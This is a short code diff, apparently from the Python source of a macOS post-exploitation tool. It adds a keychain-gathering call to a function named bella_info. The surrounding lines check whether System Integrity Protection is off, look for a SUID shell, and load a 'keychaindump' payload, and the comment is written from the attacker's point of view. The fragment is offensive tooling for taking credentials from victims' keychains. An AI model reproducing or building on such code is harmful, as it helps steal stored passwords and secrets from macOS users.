@@ -1251,6 +1251,8 @@ def bella_info():
 	else:
 		sipEnabled = False
 
+	kchain = getKeychains()
+	
 	if not sipEnabled: #sipDisabled allows us to check like .1% of cases where user is on El Cap and has opted out of SIP
 		if is_there_SUID_shell():
 			kcpayload = readDB('keychaindump', True)
